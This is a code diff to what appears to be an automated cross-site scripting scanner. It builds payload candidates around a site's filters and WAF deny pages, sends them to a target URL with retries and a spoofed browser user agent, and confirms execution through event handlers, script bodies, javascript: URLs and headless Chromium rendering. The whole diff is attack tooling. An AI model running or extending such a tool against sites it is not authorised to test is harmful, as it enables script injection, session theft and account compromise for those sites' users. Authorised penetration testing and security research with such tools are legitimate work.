+        t_low = tag.lower()
+        if self._inert_tag is not None:
+            return
         d = dict(attrs)
-        if tag == "script":
+        if t_low == "script":
             self._in_script = True
             self._script_buf = ""
+            stype = (d.get("type") or "").strip().lower()
+            self._script_nonexec = bool(
+                stype and stype not in (
+                    "text/javascript", "application/javascript", "module",
+                    "text/ecmascript", "application/ecmascript")
+                and "javascript" not in stype and "ecmascript" not in stype)
         joined = " ".join(str(v or "") for v in d.values())
-        if self.marker not in joined and self.marker not in "".join(d.keys()):
-            return
-        for k, v in d.items():
-            if k.startswith("on"):
+        has_marker = (self.marker in joined or self.marker in "".join(d.keys()))
+        if has_marker:
+            for k, v in d.items():
+                if k.startswith("on"):
+                    self.executable = True
+                    self.attr_hits.append((tag, k, v or ""))
+                    self.evidence = f"<{tag}> marker element carries event handler {k}"
+                if k in ("href", "src", "action", "formaction") and v and \
+                        re.match(r"\s*(javascript:|data:text|vbscript:)", v, re.I):
+                    self.executable = True
+                    self.url_hits.append((tag, k, v))
+                    self.evidence = f"<{tag}> marker element has executable {k} URL"
+                if k == "srcdoc" and v and re.search(r"(on\w+=|<script|&lt;script|onerror)",
+                                                     v, re.I):
+                    self.executable = True
+                    self.evidence = "marker inside <iframe srcdoc> executable HTML"
+            if t_low == "script" and not self.script_inert and not self._script_nonexec:
                 self.executable = True
-                self.attr_hits.append((tag, k, v or ""))
-                self.evidence = f"<{tag}> marker element carries event handler {k}"
-            if k in ("href", "src", "action", "formaction") and v and \
-                    re.match(r"\s*(javascript:|data:text|vbscript:)", v, re.I):
-                self.executable = True
-                self.url_hits.append((tag, k, v))
-                self.evidence = f"<{tag}> marker element has executable {k} URL"
-            if k == "srcdoc" and v and re.search(r"(on\w+=|<script|&lt;script|onerror)",
-                                                 v, re.I):
-                self.executable = True
-                self.evidence = "marker inside <iframe srcdoc> executable HTML"
-        if tag == "script" and not self.script_inert:
-            self.executable = True
-            self.evidence = "marker inside <script> element"
+                self.evidence = "marker inside <script> element"
+        if t_low in self._INERT_CONTAINERS:
+            self._inert_tag = t_low
 
     def handle_endtag(self, tag):
-        if tag == "script":
-            if self._script_buf and self.marker in self._script_buf:
+        t_low = tag.lower()
+        if self._inert_tag == t_low:
+            self._inert_tag = None
+            return
+        if self._inert_tag is not None:
+            return
+        if t_low == "script":
+            if self._script_buf and self.marker in self._script_buf \
+                    and not self._script_nonexec:
                 self.script_hits.append(self._script_buf)
             self._in_script = False
+            self._script_nonexec = False
             self._script_buf = None
 
     def handle_data(self, data):
+        if self._inert_tag is not None:
+            return
         if self._in_script:
             if self._script_buf is not None:
                 self._script_buf += data
-            if not self.script_inert and self.marker in data:
+            if not self.script_inert and not self._script_nonexec \
+                    and self.marker in data:
                 self.executable = True
                 self.evidence = "marker inside <script> body"
 
@@ -1000,11 +1228,18 @@ def classify_response(status, headers, body, payload, marker, marked=None):
         needles = [intended] + ([husk] if husk != intended else []) \
             + ([unescape(intended)]
                if unescape(intended) != intended else [])
+        mk = marker if style == "marker" else None
         for _tag, _attr, val in chk.attr_hits:
             uv = unescape(val)
             for nd in needles:
-                live, det = js_verify.payload_live_in_js(uv, nd)
+                live, det = js_verify.payload_live_in_js(uv, nd, mk)
                 if live:
+                    if det.startswith("sink assignment + throw: onerror") \
+                            and _tag.lower() != "body" \
+                            and not re.search(
+                                r"(?:self|window|top|parent|globalThis|frames)"
+                                r"\s*\.\s*onerror\s*=", uv):
+                        continue
                     return {"payload": marked, "confidence": "V",
                             "evidence": chk.evidence + " — " + det + csp_note}
         return {"payload": marked, "confidence": "R",
@@ -1020,12 +1255,13 @@ def classify_response(status, headers, body, payload, marker, marked=None):
         needles = [intended] + ([husk] if husk != intended else []) \
             + ([unescape(intended)]
                if unescape(intended) != intended else [])
+        mk = marker if style == "marker" else None
         for _tag, _attr, val in chk.url_hits:
             uv = unescape(val)
             body_js = re.sub(r"^\s*(?:javascript|data:text/html[^,]*,)\s*",
                              "", uv, flags=re.I)
             for nd in needles:
-                live, det = js_verify.payload_live_in_js(body_js, nd)
+                live, det = js_verify.payload_live_in_js(body_js, nd, mk)
                 if live:
                     break
             if live:
@@ -1081,11 +1317,30 @@ def verify_payload(url, payload, render=False, comment_ok=True):
               if sink_hits else "marker reflected but not in executable position")
         return {"payload": marked, "confidence": "R", "evidence": ev}
 
+    sess = _get_verify_session()
+    if sess is not None:
+        try:
+            for attempt in range(4):
+                req = requests.Request("GET", target)
+                prep = sess.prepare_request(req)
+                prep.url = target
+                resp = sess.send(prep, verify=False, allow_redirects=False,
+                                 timeout=15)
+                if resp.status_code not in (429, 503) or attempt == 3:
+                    break
+                import time as _t
+                _t.sleep(min(4.0, 0.3 * (2 ** attempt))
+                         + (secrets.randbelow(200) / 1000.0))
+            status = resp.status_code
+            headers = {k.lower(): v for k, v in resp.headers.items()}
+            body = resp.text
+            return classify_response(status, headers, body, payload, marker, marked)
+        except Exception:
+            pass
     try:
         raw = subprocess.run(
             ["curl", "-s", "-k", "-i", "--max-time", "15", "-A",
-             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
-             "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", target],
+             _UA, target],
             capture_output=True, text=True, timeout=20).stdout
     except Exception as e:
         return {"payload": marked, "confidence": "error", "evidence": str(e)}
@@ -1160,14 +1415,33 @@ def main():
                        if (m := re.search(r"dom sink:\s*([\w:.-]+)", c))), None)
         inert = bool(m_sink) and m_sink.group(1).lower() in INERT_SCRIPT_SINKS
         scores = char_scores(results, rid)
-        kw = kw_by_refl.get(rid, {})
-        kwv = kwv_by_refl.get(rid, {})
-        quote_ch = detect_quote(source_html, "testing1")
+        esc_q = escaped_quotes(results, rid)
+        # Fallback to reflection_index 0 when Probe 1 reflected normally
+        # (rid >= 1) but Probe 2 hit a request-level block and was bisected
+        # (stored under reflection_index 0), or vice versa.
+        kw = kw_by_refl.get(rid) or kw_by_refl.get(0) or \
+            (kw_by_refl.get(1, {}) if rid == 0 else {})
+        kwv = kwv_by_refl.get(rid) or kwv_by_refl.get(0) or \
+            (kwv_by_refl.get(1, {}) if rid == 0 else {})
+        r_rows = [r for r in results if r["reflection_index"] == rid]
+        per_q = next((r["quote"] for r in r_rows
+                      if "quote" in r and r["quote"] is not None), None)
+        js_brk = next((r.get("js_breakout") or "" for r in r_rows
+                       if r.get("js_breakout")), "")
+        quote_ch = (per_q if per_q is not None
+                    else detect_quote(source_html, "testing1"))
         # bisect-attributed rows (reflection_index 0) come from a deny page
         # with no reflection — the baseline probe carries the real quote
-        if rid == 0 and analysis.get("attribution_quote"):
+        if rid == 0 and analysis.get("attribution_quote") is not None:
             quote_ch = analysis["attribution_quote"]
-        cand = compose(ctx, quote_ch, scores, kw, kwv, inert=inert)
+        max_len = analysis.get("max_len")
+        cand = compose(ctx, quote_ch, scores, kw, kwv, inert=inert,
+                       escaped_q=esc_q, js_breakout=js_brk,
+                       deny=(rid == 0))
+        if max_len:
+            fit = [c for c in cand if len(c["payload"]) <= max_len]
+            if fit:
+                cand = fit
         # rank on equal efficiency: direct payloads execute as-is;
         # splitter probes test THIS filter's actual deletion set;
         # blind mutations (case/entity) are last-resort guesses.
@@ -1219,28 +1493,75 @@ def main():
                 # tail carries <>: fall back to a /* */ comment tail — it
                 # lands inert inside handlers/attrs and survives strpos lists
                 comment_ok = usable("<", scores) and usable(">", scores)
+                # Adaptive parallelism: concurrent static verify on clean
+                # targets; drop to 1 worker when WAF/deny attribution (rid==0)
+                # or headless rendering is active.
+                workers = 1 if (render or rid == 0) else 4
                 while wave:
                     found = False
+                    batch = []
                     for c in wave:
-                        if c["payload"] in seen:
-                            continue
-                        seen.add(c["payload"])
-                        v = verify_payload(args.url, c["payload"],
-                                           render=render,
-                                           comment_ok=comment_ok)
-                        verified.append(v)
-                        if v["confidence"] == "V":
-                            found = True
-                            if cap > 2:
-                                break      # expansion wave: first hit suffices
+                        if c["payload"] not in seen:
+                            seen.add(c["payload"])
+                            batch.append(c["payload"])
+                    if not batch:
+                        break
+                    if workers > 1 and len(batch) > 1:
+                        with ThreadPoolExecutor(
+                                max_workers=min(workers, len(batch))) as ex:
+                            b_vers = list(ex.map(
+                                lambda p: verify_payload(
+                                    args.url, p, render=False,
+                                    comment_ok=comment_ok),
+                                batch))
+                        for v in b_vers:
+                            verified.append(v)
+                            if v["confidence"] == "V":
+                                found = True
+                                if cap > 2:
+                                    break
+                    else:
+                        for p in batch:
+                            v = verify_payload(args.url, p,
+                                               render=render,
+                                               comment_ok=comment_ok)
+                            verified.append(v)
+                            if v["confidence"] == "V":
+                                found = True
+                                if cap > 2:
+                                    break      # expansion wave: first hit suffices
                     if found or cap >= 16:
                         break
                     cap *= 2
                     more = compose(ctx, quote_ch, scores, kw, kwv, inert,
-                                   fn_cap=cap)
+                                   fn_cap=cap, escaped_q=esc_q,
+                                   js_breakout=js_brk, deny=(rid == 0))
+                    if max_len:
+                        more_fit = [c for c in more
+                                    if len(c["payload"]) <= max_len]
+                        if more_fit:
+                            more = more_fit
                     more.sort(key=lambda c: (-c["efficiency"], tier(c)))
                     wave = [c for c in more
                             if c["payload"] not in seen][:args.top]
+
+                # Hybrid Static -> Render Escalation (C3): when static verify
+                # found no [V] but returned [R] (or page has DOM plumbing),
+                # escalate top 2 candidates to real Chromium (window.__fired).
+                if not render and not any(v["confidence"] == "V"
+                                          for v in verified):
+                    has_r = any(v["confidence"] == "R" for v in verified)
+                    if has_r or analysis.get("dom_hint"):
+                        for idx, c in enumerate(cand[:2]):
+                            rv = verify_payload(args.url, c["payload"],
+                                                render=True,
+                                                comment_ok=comment_ok)
+                            if rv["confidence"] == "V":
+                                if idx < len(verified):
+                                    verified[idx] = rv
+                                else:
+                                    verified.append(rv)
+                                break
                 entry["verification"] = verified
                 for v in verified:
                     print(f"        [{v['confidence']}] {v['payload']}")
